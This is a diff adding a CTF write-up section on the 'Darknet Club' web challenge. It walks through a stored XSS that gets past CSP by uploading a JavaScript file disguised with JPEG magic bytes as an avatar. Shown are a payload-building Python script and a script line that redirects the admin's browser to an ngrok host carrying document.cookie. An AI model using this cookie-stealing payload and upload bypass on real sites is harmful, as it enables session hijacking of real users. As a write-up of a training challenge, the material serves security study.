@@ -426,7 +426,7 @@ Found. Redirecting to /?redirect=/admin&error=TokenExpiredError%3A%20jwt%20expir
 ```TokenExpiredError```
 
 The token expires really fast, so we can't get the flag manually.
-Let's create a smarter endpoint, which will receive the token and get the flag faster for us.
+Let's create a faster endpoint, which will receive the token and get the flag for us on time.
 
 ![flash](img/flash.jpg)
 
@@ -531,7 +531,168 @@ INTENT{d0nt_mass_with_ap1s}
 
 Next!
 
-# 
+# Darknet Club
+
+![darknet-club-description](img/darknet-club-description.png)
+
+## Challenge
+
+This was, in my shitty opinion, the most creative web challenge in the CTF (but I didn't have time to look at sigNULL).
+
+After registration and login, we go to the profile page.
+
+![darknet-club-page](img/darknet-club-page.png)
+
+* We can change the parameters in our profile.
+* The ```Request Invitation``` option takes no parameters and returns nothing. 
+
+## Hacking
+
+Let's assume there is an admin bot who will take a look at our profile after the invitation request is sent.
+We need to try a [XSS](https://owasp.org/www-community/attacks/xss/) here.
+
+After changing all fields, we see that the ```Referral``` is not sanitized and, at first, vulnerable to XSS:
+
+Let's try adding a HTML and scripting to it:
+
+```html
+<strong>Admin</strong><script>alert(1);</script>
+```
+
+The ```Admin``` got bold with the strong tag, but no alert fired. This errors happens in the Javascript side:
+
+```Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.```
+
+This happens because the server is sending the following [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) directives in the /profile header:
+
+```yaml
+content-security-policy: default-src 'self'; object-src 'none'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;
+```
+
+The policy contains a ```default-src 'self'```, which means it will only run Javascript from a file inside the same domain (actually, there's many more details to it, but let's keep things simple).
+
+So, to explore this XSS, we need a Javascript on the server-side of the current domain. Which we don't have. And we can't upload. Can't we??
+
+You have an option to upload an avatar, but the server does not allows us to send a JS there.
+
+![darknet-club-page](img/darknet-club-avatar-blocked-js.png)
+
+```This file could not be uploaded, only JPEG files are allowed!```
+
+The file have to be a JPEG for the server to allow it. After playing a bit with it, we see that it just check the file signature. Not even the file extension.
+
+Let's create a fake file, using the signature from some random jpeg.
+
+```
+$ dd if=download.jpg bs=1 count=3 of=somefile.js
+
+3+0 records in
+3+0 records out
+3 bytes copied, 0,000481273 s, 6,2 kB/s
+
+$ hexdump -C somefile.js 
+
+00000000  ff d8 ff                                          |...|
+00000003
+```
+
+Now you receive an ```Image uploaded successfully!```
+
+We can't just send a random jpeg with in the middle of the text. It wont work.
+
+There is a VERY interesting article, by [Gareth Heyes](https://twitter.com/garethheyes), on [Bypassing CSP using polyglot JPEGs
+](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs). 
+
+This is not the article we want, but it is the article we need.
+
+![batman](img/batman.jpg)
+
+This is great but we need only to solve a subset of Gareth's problem. We don't need a full polyglot jpeg but just the first part. It turns out the JPEG signature can be used as a valid variable name in Javascript. We can have a first line like this:
+
+```javascript
+jpeg_signature=1;
+-- any payload we want!
+```
+
+To make it easier, since I was testing some different payloads at the time, I created a small script to assemble the payload.
+
+```python
+out = open('jpeg-payload.js', 'wb')
+payload = ''
+
+with open('payload.js', 'rb') as file:
+    payload = file.read()
+
+# Fake header
+out.write(b'\xff\xd8\xff=1;')
+out.write(payload)
+
+out.close()
+```
+
+For the actual Javascript payload. I tried to first make a fetch my URL with the admin cookie, but fetching other domain is blocked by CSP. We can bypass it by redirecting the browser page to our domain.
+
+```javascript
+window.location.href = 'http://66e9-201-17-126-102.ngrok.io/flag?'+encodeURIComponent(document.cookie);
+```
+
+Let's generate our payload and upload it.
+
+```
+$ python inject.py 
+neptunian:~/ctf/intent-ctf-2021/web/writeup/darknet-club$ hexdump -C jpeg-payload.js 
+00000000  ff d8 ff 3d 31 3b 77 69  6e 64 6f 77 2e 6c 6f 63  |...=1;window.loc|
+00000010  61 74 69 6f 6e 2e 68 72  65 66 20 3d 20 27 68 74  |ation.href = 'ht|
+00000020  74 70 3a 2f 2f 36 36 65  39 2d 32 30 31 2d 31 37  |tp://66e9-201-17|
+00000030  2d 31 32 36 2d 31 30 32  2e 6e 67 72 6f 6b 2e 69  |-126-102.ngrok.i|
+00000040  6f 2f 66 6c 61 67 3f 27  2b 65 6e 63 6f 64 65 55  |o/flag?'+encodeU|
+00000050  52 49 43 6f 6d 70 6f 6e  65 6e 74 28 64 6f 63 75  |RIComponent(docu|
+00000060  6d 65 6e 74 2e 63 6f 6f  6b 69 65 29 3b           |ment.cookie);|
+0000006d
+$
+```
+
+```Image uploaded successfully!```
+
+Let's try getting the image from the avatar URL ```https://darknet-club.chal.intentsummit.org/api/avatar/nep3```
+
+```
+$ curl -k https://darknet-club.chal.intentsummit.org/api/avatar/nep3 | hexdump -C
+
+00000000  ff d8 ff 3d 31 3b 77 69  6e 64 6f 77 2e 6c 6f 63  |...=1;window.loc|
+00000010  61 74 69 6f 6e 2e 68 72  65 66 20 3d 20 27 68 74  |ation.href = 'ht|
+00000020  74 70 3a 2f 2f 36 36 65  39 2d 32 30 31 2d 31 37  |tp://66e9-201-17|
+00000030  2d 31 32 36 2d 31 30 32  2e 6e 67 72 6f 6b 2e 69  |-126-102.ngrok.i|
+00000040  6f 2f 66 6c 61 67 3f 27  2b 65 6e 63 6f 64 65 55  |o/flag?'+encodeU|
+00000050  52 49 43 6f 6d 70 6f 6e  65 6e 74 28 64 6f 63 75  |RIComponent(docu|
+00000060  6d 65 6e 74 2e 63 6f 6f  6b 69 65 29 3b           |ment.cookie);|
+0000006d
+```
+
+It's our payload. Now, let's change the referral to call our javascript:
+
+```html
+<strong>Admin</strong><script charset="ISO-8859-1"  type="text/javascript" src="/api/avatar/nep3"></script>
+```
+
+After saving, it immediatelly redirects us to our ngrok.
+
+![darknet-club-redirected](img/darknet-club-redirected.png)
+
+The cookie is ours (if you're brazilian, please avoid daddy jokes by not translating it):
+
+![darknet-club-cookie-received](img/darknet-club-cookie-received.png)
+
+So now, we have to (FINALLY) ask for the admin to check our profile. Since our profile now ALWAYS redirects us very fast, let's just send it with curl (please, no 5th grade brazilian jokes here!).
+
+```text
+curl -k -v -X POST 'https://darknet-club.chal.intentsummit.org/api/report' \
+  -H 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5lcDMiLCJpYXQiOjE2MzcxMDAwMjV9.ERu4iZCxE6DyqBe3qmX00WGiux--ikLQBiLbxmeSN3s'
+```
+
+![darknet-club-got-flag](img/darknet-club-got-flag.png)
+
+```INTENT{a_jp36_1s_w0r7h_a_7h0u54nd_w0rd5}```
 
 # References
 
@@ -541,6 +702,8 @@ Next!
 * ASISCTF 2021 - ASCII art as a service: https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/
 * Defenit CTF 2020 - TAR Analyzer: https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4
 * [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/)
+* OWASP - Cross Site Scripting (XSS): https://owasp.org/www-community/attacks/xss/
+* Content Security Policy (CSP): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 * Repo with the artifacts discussed here: https://github.com/Neptunians/intent-ctf-2021-writeup
 * Team: [FireShell](https://fireshellsecurity.team/)
 * Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
